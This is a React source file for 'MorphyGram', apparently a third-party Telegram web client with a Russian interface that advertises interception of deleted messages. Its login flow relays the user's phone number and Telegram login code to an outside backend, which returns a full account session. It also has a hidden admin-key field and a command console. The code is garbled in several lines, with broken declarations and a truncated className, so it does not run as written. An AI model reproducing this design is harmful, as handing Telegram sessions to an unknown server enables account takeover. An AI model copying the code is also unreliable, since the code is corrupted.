import React, { useState, useEffect } from 'react';
import { Shield, EyeOff, Trash2, Send, Zap, Settings, Download, Terminal } from 'lucide-react';

export default function App() {
  const [step,- setStep] = useState(0);3 // 0 = лендинг", 1 = вход, /> 2 = код, 3 = чат
  const [phone Со, setPhone] = useState('');
  const [code, setCode] = useState('');
  const [hash, setHash] = useState('');
  const [loading, setLoading] = useState(false);
  const [session, setSession] = useState(localStorage.getItem('mg_session') || null);
  const [adminKey, setAdminKey] = useState('');
  const [showAdminField, setShowAdminField] = useState(false);
  const [isAdmin, setIsAdmin] = useState(localStorage.getItem('mg_admin') === 'true');

  // Состояние для консоли команд
  const [cmdInput, setCmdInput] = useState('');

  const BACKEND_URL = 'https://morphygram-backend.onrender.com';

  useEffect(() => {
    if (session) setStep(3);
  }, [session]);

  const handleSendCode = async () => {
    setLoading(true);
    try {
      const res = await fetch(`${BACKEND_URL}/api/send-code`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone })
      });
      const data = await res.json();
      if (res.ok) {
        setHash(data.phone_code_hash);
        setStep(2);
      } else {
        alert(data.detail || 'Ошибка отправки кода');
      }
    } catch (e) {
      alert('Ошибка соединения с сервером');
    }
    setLoading(false);
  };

  const handleLogin = async () => {
    setLoading(true);
    try {
      const res = await fetch(`${BACKEND_URL}/api/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone, code, phone_code_hash: hash, admin_key: adminKey })
      });
      const data = await res.json();
      if (res.ok) {
        localStorage.setItem('mg_session', data.session);
        setSession(data.session);
        if (data.is_admin) {
          localStorage.setItem('mg_admin', 'true');
          setIsAdmin(true);
        }
        setStep(3);
      } else {
        alert(data.detail || 'Ошибка входа');
      }
    } catch (e) {
      alert('Ошибка соединения с сервером');
    }
    setLoading(false);
  };

  const executeCommand = async () => {
    if (!cmdInput.trim()) return;
    try {
      const parts = cmdInput.trim().split(' ');
      const command = parts[0];
      const target = parts[1] || null;
      
      const res = await fetch(`${BACKEND_URL}/api/command`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ session, command, target })
      });
      const data = await res.json();
      if (res.ok) {
        alert(data.result);
        setCmdInput('');
      } else {
        alert(data.detail);
      }
    } catch (e) {
      alert('Ошибка при выполнении команды');
    }
  };

  // --- ЭКРАН 0: ЛЕНДИНГ ---
  if (step === 0) {
    return (
      <div className="min-h-screen flex flex-col items-center justify-center bg-gradient-to-b from-slate-950 via-slate-900 to-black p-6 text-center">
        <div className="w-24 h-24 bg-red-600/10 border border-red-500/30 rounded-3xl flex items-center justify-center mb-8 shadow-[0_0_50px_rgba(239,68,68,0.2)]">
            <Zap className="w-12 h-12 text-red-500" />
        </div>
        <h1 className="text-4xl font-black tracking-tight mb-4 text-white">
            Morphy<span className="text-red-500">Gram</span>
        </h1>
        <p className="text-slate-400 max-w-sm mb-12 leading-relaxed">
            Клиент нового поколения. Перехват удалённых сообщений, скрытый режим и полный контроль над твоим Телеграмом.
        </p>
        
        <button 
          onClick={() => setStep(1)}
          className="group relative inline-flex items-center justify-center gap-3 px-8 py-4 bg-red-600 hover:bg-red-500 text-white font-semibold rounded-2xl transition-all duration-300 shadow-[0_0_30px_rgba(220,38,38,0.3)] hover:shadow-[0_0_40px_rgba(220,38,38,0.6)] w-full max-w-xs"
        >
          <Download className="w-5 h-5 group-hover:animate-bounce" />
          Скачать приложение
        </button>
        
        <p className="text-xs text-slate-600 mt-6 max-w-xs">
            * Для установки на iPhone нажмите "Поделиться" в Safari и выберите "На экран «Домой»".
        </p>
      </div>
    );
  }

  // --- ЭКРАН 1 и 2: ВХОД ---
  if (step === 1 || step === 2) {
    return (
      <div className="min-h-screen flex items-center justify-center p-4 bg-gradient-to-br from-slate-950 via-slate-900 to-black">
        <div className="w-full max-w-md p-6 bg-slate-900/80 border border-slate-800 rounded-2xl backdrop-blur-xl shadow-2xl relative">
          <button onClick={() => setStep(0)} className="text-slate-500 hover:text-white mb-4 text-sm">&larr; Назад</button>
          
          <div className="text-center mb-6">
            <h2 className="text-2xl font-bold tracking-tight">Вход в MorphyGram</h2>
            <p className="text-slate-400 text-sm mt-1">Безопасная авторизация</p>
          </div>

          {step === 1 ? (
            <div className="space-y-4">
              <div>
                <label className="block text-xs text-slate-400 mb-1">Номер телефона</label>
                <input 
                  type="text" 
                  placeholder="+79991112233" 
                  value={phone}
                  onChange={(e) => setPhone(e.target.value)}
                  className="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-3 text-sm focus:outline-none focus:border-red-500 transition"
                />
              </div>
              <button onClick={handleSendCode} disabled={loading} className="w-full bg-red-600 hover:bg-red-500 text-white font-medium py-3 rounded-xl transition disabled:opacity-50">
                {loading ? 'Отправка...' : 'Получить код'}
              </button>
            </div>
          ) : (
            <div className="space-y-4">
              <div>
                <label className="block text-xs text-slate-400 mb-1">Код из Telegram</label>
                <input 
                  type="text" 
                  placeholder="12345" 
                  value={code}
                  onChange={(e) => setCode(e.target.value)}
                  className="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-3 text-sm focus:outline-none focus:border-red-500 transition text-center tracking-widest text-lg"
                />
              </div>
              <button onClick={handleLogin} disabled={loading} className="w-full bg-red-600 hover:bg-red-500 text-white font-medium py-3 rounded-xl transition disabled:opacity-50">
                {loading ? 'Вход...' : 'Войти'}
              </button>
            </div>
          )}

          {/* Скрытая панель админа */}
          <button 
            type="button"
            onClick={() => setShowAdminField(!showAdminField)}
            className="absolute top-4 right-4 p-2 text-slate-700 hover:text-red-500 transition"
          >
            <Settings className="w-4 h-4" />
          </button>

          {showAdminField && (
            <div className="mt-4 pt-4 border-t border-slate-800">
              <label className="block text-xs text-red-500/70 mb-1 font-mono">Секретный ключ</label>
              <input 
                type="password" 
                placeholder="********" 
                value={adminKey}
                onChange={(e) => setAdminKey(e.target.value)}
                className="w-full bg-slate-950 border border-red-900/30 rounded-xl px-4 py-2 text-sm focus:outline-none focus:border-red-500 transition text-red-400 font-mono"
              />
            </div>
          )}
        </div>
      </div>
    );
  }

  // --- ЭКРАН 3: ЧАТ И КОНСОЛЬ ---
  return (
    <div className="flex h-screen bg-slate-950 text-slate-100">
      {/* Боковая панель */}
      <div className="w-full md:w-80 border-r border-slate-800 flex flex-col bg-slate-900/30">
        <div className="p-4 border-b border-slate-800 flex items-center justify-between">
          <h1 className="font-bold text-lg text-red-500 flex items-center gap-2">
            <Zap className="w-5 h-5 fill-red-500" /> MorphyGram
          </h1>
          {isAdmin && (
            <span className="text-[10px] px-2 py-1 bg-red-500/20 text-red-400 border border-red-500/30 rounded-full font-mono">
              ADMIN
            </span>
          )}
        </div>
        
        <div className="p-4 flex-1 overflow-y-auto">
            <div className="text-slate-500 text-sm text-center">Чаты загружаются...</div>
        </div>

        {/* Консоль команд */}
        <div className="p-4 border-t border-slate-800 bg-slate-900/50">
          <label className="block text-[10px] text-slate-500 mb-1 flex items-center gap-1">
            <Terminal className="w-3 h-3" /> Консоль управления
          </label>
          <div className="flex gap-2">
            <input 
              type="text" 
              placeholder=".mute @user" 
              value={cmdInput}
              onChange={(e) => setCmdInput(e.target.value)}
              onKeyDown={(e) => e.key === 'Enter' && executeCommand()}
              className="flex-1 bg-slate-950 border border-slate-800 rounded-lg px-3 py-1.5 text-xs focus:outline-none focus:border-red-500/50 text-emerald-400 font-mono"
            />
            <button onClick={executeCommand} className="bg-slate-800 hover:bg-slate-700 text-slate-300 p-1.5 rounded-lg transition">
              <Send className="w-3 h-3" />
            </button>
          </div>
        </div>
      </div>

      {/* Область чата */}
      <div className="hidden md:flex flex-1 flex-col justify-between bg-slate-900/20">
        <div className="p-4 border-b border-slate-800 flex items-center justify-between">
          <div className="flex items-center gap-2">
            <div className="w-10 h-10 rounded-full bg-red-600/20 flex items-center justify-center text-red-500 font-bold">
              MG
            </div>
            <div>
              <div className="font-semibold">Избранное (Ghost Mode)</div>
              <div className="text-xs text-emerald-400 flex items-center gap-1">
                <Shield className="w-3 h-3" /> Перехват удаленок включен
              </div>
            </div>
          </div>
          <button 
            onClick={() => { localStorage.clear(); setSession(null); setStep(0); }} 
            className="text-xs text-slate-500 hover:text-red-500 transition"
          >
            Выйти
          </button>
        </div>

        <div className="p-4 space-y-3 overflow-y-auto">
          <div className="bg-slate-800/60 p-3 rounded-lg max-w-md border border-slate-700/50">
            <p className="text-sm">Добро пожаловать в MorphyGram Web! 🚀</p>
            <span className="text-[10px] text-slate-400 mt-1 block">12:00</span>
          </div>
          <div className="bg-red-950/30 p-3 rounded-lg max-w-md border border-red-900/40 relative">
            <div className="text-xs text-red-400 font-semibold mb-1 flex items-center gap-1">
              <Trash2 className="w-3 hобщение было удалено
            </div>
            <p className="text-sm text-slate-200">Это сообщение перехвачено!</p>
            <span className="text-[10px] text-slate-400 mt-1 block">12:01</span>
          </div>
        </div>

        <div className="p-4 border-t border-slate-800 flex items-center gap-2">
          <input 
            type="text" 
            placeholder="Написать сообщение..." 
            className="flex-1 bg-slate-900 border border-slate-800 rounded-xl px-4 py-2 text-sm focus:outline-none focus:border-red-500/50"
          />
          <button className="bg-red-600 hover:bg-red-500 text-white p-2 rounded-xl transition">
            <Send className="w-4 h-4" />
          </button>
        </div>
      </div>
    </div>
  );
}
